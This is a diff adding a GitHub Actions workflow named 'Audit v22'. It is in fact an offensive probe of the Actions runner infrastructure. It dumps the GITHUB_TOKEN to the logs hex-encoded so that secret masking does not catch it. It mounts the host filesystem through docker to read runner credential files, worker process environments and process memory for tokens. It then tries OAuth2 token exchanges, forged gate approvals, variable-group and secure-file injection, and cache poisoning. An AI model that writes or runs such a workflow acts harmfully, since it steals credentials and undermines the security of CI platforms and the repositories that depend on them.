@@ -1,0 +1,472 @@
+name: Audit v22
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v22:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + fix .credentials path
+      # v21: glob cached/* missed extracted/ directory
+      # Use find to locate ALL credential files
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V22 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+
+          # Fix: use find instead of glob, search ALL runner dirs
+          echo "--- Credential extraction ---"
+          docker run --rm -v /:/h alpine sh -c '
+            echo "=== FIND ALL CREDENTIAL FILES ==="
+            find /h/home/runner -name ".credentials" -o -name ".credentials_rsaparams" -o -name ".runner" -o -name ".env" 2>/dev/null
+
+            echo ""
+            echo "=== .credentials ==="
+            for F in $(find /h/home/runner -name ".credentials" 2>/dev/null); do
+              echo "FILE: $F ($(wc -c < "$F") bytes)"
+              cat "$F" 2>/dev/null
+              echo ""
+            done
+
+            echo "=== .credentials_rsaparams ==="
+            for F in $(find /h/home/runner -name ".credentials_rsaparams" 2>/dev/null); do
+              echo "FILE: $F ($(wc -c < "$F") bytes)"
+              cat "$F" 2>/dev/null
+              echo ""
+            done
+
+            echo "=== .runner ==="
+            for F in $(find /h/home/runner -name ".runner" 2>/dev/null); do
+              echo "FILE: $F"
+              cat "$F" 2>/dev/null
+              echo ""
+            done
+
+            echo "=== ENVIRONMENT VARS (from worker process) ==="
+            for P in $(ls /h/proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -80); do
+              CMD=$(cat /h/proc/$P/cmdline 2>/dev/null | tr "\0" " " | head -c 80)
+              case "$CMD" in
+                *Runner.Worker*)
+                  echo "PID=$P"
+                  cat /h/proc/$P/environ 2>/dev/null | tr "\0" "\n" | grep -iE "ACTIONS_RUNTIME|ACTIONS_CACHE|ACTIONS_RESULTS|ACTIONS_ID_TOKEN" 2>/dev/null
+                  echo ""
+                  ;;
+              esac
+            done
+          ' 2>&1 | tee /tmp/docker_creds.txt | head -80
+
+          # Extract credential token for use in later steps
+          python3 -c "
+          import json
+          try:
+            raw = open('/tmp/docker_creds.txt').read()
+            # Find JSON between === .credentials === markers
+            start = raw.find('{\"Data\"')
+            if start < 0: start = raw.find('{\"Scheme\"')
+            if start < 0: start = raw.find('{\"scheme\"')
+            if start >= 0:
+              depth = 0
+              end = start
+              for i, c in enumerate(raw[start:], start):
+                if c == '{': depth += 1
+                elif c == '}': depth -= 1
+                if depth == 0: end = i + 1; break
+              cred_json = raw[start:end]
+              data = json.loads(cred_json)
+              token = data.get('Data', data).get('token', '')
+              open('/tmp/cred_token.txt', 'w').write(token)
+              print(f'CRED_TOKEN: {len(token)} chars, prefix={token[:30]}')
+          except Exception as e:
+            print(f'Parse error: {e}')
+          " 2>&1
+
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: oauth2/token exchange — CORRECT CONTENT TYPE
+      # v21: endpoint returned 500 saying it wants form-urlencoded!
+      # This is the #1 most promising finding
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - OAuth2 token exchange
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== OAUTH2 TOKEN EXCHANGE ==="
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          [ -z "$PURL" ] && exit 0
+
+          # A: form-urlencoded with various grant types
+          echo "--- A: Grant types ---"
+          for GRANT in \
+            "client_credentials" \
+            "urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            "refresh_token" \
+            "authorization_code" \
+            "password" \
+            "urn:ietf:params:oauth:grant-type:token-exchange"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "${PURL}_apis/oauth2/token" \
+              -d "grant_type=$GRANT&assertion=$RT&client_id=v22&scope=vso.full_access&resource=https://pipelinesghubeus14.actions.githubusercontent.com")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $GRANT = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: Try with credential token if available
+          echo "--- B: Credential token ---"
+          if [ -n "$CTOK" ]; then
+            for GRANT in "client_credentials" "urn:ietf:params:oauth:grant-type:jwt-bearer"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $CTOK" \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "${PURL}_apis/oauth2/token" \
+                -d "grant_type=$GRANT&assertion=$CTOK&client_assertion=$CTOK&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&scope=vso.full_access")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "B cred $GRANT = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+          fi
+          echo ""
+
+          # C: Try without Authorization header (use assertion only)
+          echo "--- C: No-auth ---"
+          for GRANT in "client_credentials" "urn:ietf:params:oauth:grant-type:jwt-bearer"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "${PURL}_apis/oauth2/token" \
+              -d "grant_type=$GRANT&assertion=$RT&client_assertion=$RT&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C no-auth $GRANT = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # D: OIDC token as assertion
+          echo "--- D: OIDC assertion ---"
+          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelinesghubeus14.actions.githubusercontent.com" | jq -r '.value // empty')
+          if [ -n "$OIDC" ]; then
+            for GRANT in "urn:ietf:params:oauth:grant-type:jwt-bearer" "urn:ietf:params:oauth:grant-type:token-exchange"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "${PURL}_apis/oauth2/token" \
+                -d "grant_type=$GRANT&assertion=$OIDC&subject_token=$OIDC&subject_token_type=urn:ietf:params:oauth:token-type:jwt&scope=vso.full_access")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "D oidc $GRANT = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: Service definitions — hit events, gates, containers
+      # v21 found 95 definitions. Hit the ones we haven't explored.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Service definitions
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SERVICE DEFINITIONS ==="
+          RT=$(cat /tmp/rt.txt)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          [ -z "$PURL" ] && exit 0
+
+          # A: Get ALL service definitions (not truncated)
+          echo "--- A: Full service list ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "${PURL}_apis/connectionData?connectOptions=1&lastChangeId=-1&includeServices=true")
+          echo "$R" | jq -c '.locationServiceData.serviceDefinitions[]? | {serviceType, identifier, displayName, relativeToSetting, relativePath}' 2>/dev/null
+          echo ""
+
+          # B: Hit each discovered service
+          echo "--- B: Service endpoints ---"
+          for SVC in \
+            "_apis/distributedtask/events" \
+            "_apis/distributedtask/agents" \
+            "_apis/distributedtask/enterpriseaccesspolicies" \
+            "_apis/distributedtask/agentCloudRequestMessages" \
+            "_apis/distributedtask/agentclouds" \
+            "_apis/distributedtask/agentpools" \
+            "_apis/distributedtask/deploymentgroups" \
+            "_apis/distributedtask/environments" \
+            "_apis/distributedtask/machinegroups" \
+            "_apis/distributedtask/queues" \
+            "_apis/distributedtask/securefiles" \
+            "_apis/distributedtask/taskgroups" \
+            "_apis/distributedtask/tasks" \
+            "_apis/distributedtask/variablegroups" \
+            "_apis/actions/gates" \
+            "_apis/actions/containers" \
+            "_apis/PipelinesChecks/runs" \
+            "_apis/PipelinesChecks/configurations" \
+            "_apis/PipelinesChecks/evaluations" \
+            "_apis/runtime/pipelines" \
+            "_apis/runner/registration" \
+            "_apis/runner/pools" \
+            "_apis/runner/agents" \
+            "_apis/build/builds" \
+            "_apis/build/definitions" \
+            "_apis/pipelines/runs"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "${PURL}${SVC}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B $SVC = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # C: POST attempts on promising endpoints
+          echo "--- C: POST attacks ---"
+          # Events — can we inject events?
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/distributedtask/events" \
+            -d '{"name":"v22-injected","data":"test"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C POST events = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
+
+          # Variable groups — create one
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/distributedtask/variablegroups" \
+            -d '{"name":"v22-vars","type":"Vsts","variables":{"secret":{"value":"v22-poison","isSecret":true}}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C POST variablegroups = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
+
+          # Secure files — upload
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/octet-stream" \
+            "${PURL}_apis/distributedtask/securefiles?name=v22.key" \
+            --data-binary "V22-INJECTED-SECURE-FILE")
+          CODE=$(echo "$R" | tail -1)
+          echo "C POST securefiles = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
+
+          # Gates — bypass approval
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/actions/gates" \
+            -d '{"status":"approved","comment":"v22 bypass"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C POST gates = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
+
+          # Containers — create
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "${PURL}_apis/actions/containers" \
+            -d '{"name":"v22-container"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C POST containers = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Worker env extraction — get ACTIONS_RUNTIME_TOKEN
+      # from the WORKER PROCESS environment, not our shell env
+      # The worker might have tokens that aren't passed to step shell
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Worker tokens
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== WORKER TOKENS ==="
+          RT=$(cat /tmp/rt.txt)
+
+          # Get ALL env vars from worker process via Docker
+          docker run --rm -v /:/h alpine sh -c '
+            for P in $(ls /h/proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -100); do
+              CMD=$(cat /h/proc/$P/cmdline 2>/dev/null | tr "\0" " " | head -c 80)
+              case "$CMD" in
+                *Runner.Worker*)
+                  echo "=== WORKER PID=$P ==="
+                  echo "--- ALL TOKEN/URL VARS ---"
+                  cat /h/proc/$P/environ 2>/dev/null | tr "\0" "\n" | grep -iE "^ACTIONS_|^GITHUB_|^RUNNER_|^SYSTEM_|^AZURE_|TOKEN=|URL=|SECRET=" 2>/dev/null | sort
+                  echo ""
+                  echo "--- MEMORY STRINGS (tokens) ---"
+                  strings /h/proc/$P/mem 2>/dev/null | grep -E "^eyJ[A-Za-z0-9_-]{50,}" | head -5
+                  ;;
+                *Runner.Listener*)
+                  echo "=== LISTENER PID=$P ==="
+                  cat /h/proc/$P/environ 2>/dev/null | tr "\0" "\n" | grep -iE "^ACTIONS_|^GITHUB_|^RUNNER_|TOKEN=|URL=|SECRET=" 2>/dev/null | sort
+                  echo ""
+                  ;;
+              esac
+            done
+          ' 2>&1 | tee /tmp/worker_env.txt | head -60
+
+          # Extract any tokens we find
+          echo "--- Extracting tokens ---"
+          WORKER_ART=$(grep "ACTIONS_RUNTIME_TOKEN=" /tmp/worker_env.txt 2>/dev/null | head -1 | cut -d= -f2-)
+          WORKER_CACHE=$(grep "ACTIONS_CACHE_URL=" /tmp/worker_env.txt 2>/dev/null | head -1 | cut -d= -f2-)
+          WORKER_RESULTS=$(grep "ACTIONS_RESULTS_URL=" /tmp/worker_env.txt 2>/dev/null | head -1 | cut -d= -f2-)
+          echo "WORKER_ART: ${#WORKER_ART} chars"
+          echo "WORKER_CACHE: $WORKER_CACHE"
+          echo "WORKER_RESULTS: $WORKER_RESULTS"
+
+          if [ -n "$WORKER_ART" ]; then
+            echo "$WORKER_ART" > /tmp/worker_art.txt
+            echo "ART_PREFIX=$(echo "$WORKER_ART" | head -c 30)"
+            echo "ART_HEX=$(echo -n "$WORKER_ART" | xxd -p | head -c 80)"
+
+            # Immediately try cache operations with this token
+            echo "--- Cache with worker ART ---"
+            ACU="$WORKER_CACHE"
+            if [ -z "$ACU" ]; then
+              ACU=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
+            fi
+
+            if [ -n "$ACU" ]; then
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $WORKER_ART" -H "Content-Type: application/json" \
+                -H "Accept: application/json;api-version=6.0-preview.1" \
+                "${ACU}_apis/artifactcache/caches" \
+                -d '{"key":"v22-worker-poison","version":"v22"}')
+              CODE=$(echo "$R" | tail -1)
+              echo "CACHE_RESERVE = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+            fi
+
+            # Try results-receiver
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $WORKER_ART" -H "Content-Type: application/json" \
+              "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+              -d '{"key":"v22-art","version":"1"}')
+            CODE=$(echo "$R" | tail -1)
+            echo "RESULTS_CACHE = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $WORKER_ART" -H "Content-Type: application/json" \
+              "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
+              -d '{"name":"v22-art","workflow_run_backend_id":"1","workflow_job_run_backend_id":"1"}')
+            CODE=$(echo "$R" | tail -1)
+            echo "RESULTS_ARTIFACT = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Run-service with credential token
+      # v21: .credentials was 0 bytes because wrong path
+      # If we extract it here, try it on run-service
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Cred token on services
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CRED TOKEN ==="
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          RT=$(cat /tmp/rt.txt)
+          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+
+          echo "CTOK: ${#CTOK} chars"
+
+          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
+            echo "--- A: Run service with cred token ---"
+            if [ -n "$RUN_URL" ]; then
+              for EP in "" "check" "_apis/pipelines/runs"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: Bearer $CTOK" "${RUN_URL}${EP}")
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                echo "A run $EP = $CODE | $(echo "$BODY" | head -c 200)"
+              done
+            fi
+
+            echo "--- B: Pipeline timeline with cred token ---"
+            if [ -n "$PURL" ] && [ -n "$PLAN" ]; then
+              for EP in \
+                "_apis/distributedtask/plans/$PLAN/timelines" \
+                "_apis/distributedtask/plans/$PLAN/logs" \
+                "_apis/distributedtask/plans/$PLAN/attachments" \
+                "_apis/distributedtask/plans/$PLAN/events"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: Bearer $CTOK" "${PURL}${EP}")
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                [ "$CODE" != "HTTP_404" ] && \
+                  echo "B pipe $EP = $CODE | $(echo "$BODY" | head -c 300)"
+              done
+            fi
+
+            echo "--- C: Cache with cred token ---"
+            CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
+            if [ -n "$CACHE_URL" ]; then
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+                -H "Accept: application/json;api-version=6.0-preview.1" \
+                "${CACHE_URL}_apis/artifactcache/caches" \
+                -d '{"key":"v22-cred","version":"v22"}')
+              CODE=$(echo "$R" | tail -1)
+              echo "C cache = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+            fi
+
+            echo "--- D: OAuth2 with cred token ---"
+            if [ -n "$PURL" ]; then
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "${PURL}_apis/oauth2/token" \
+                -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$CTOK&scope=vso.full_access")
+              CODE=$(echo "$R" | tail -1)
+              echo "D oauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+            fi
+          else
+            echo "NO CREDENTIAL TOKEN EXTRACTED"
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V22 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "CTOK_LEN=$(wc -c < /tmp/cred_token.txt 2>/dev/null)"
+          echo "WART_LEN=$(wc -c < /tmp/worker_art.txt 2>/dev/null)"
+          echo "=== V22 COMPLETE ==="
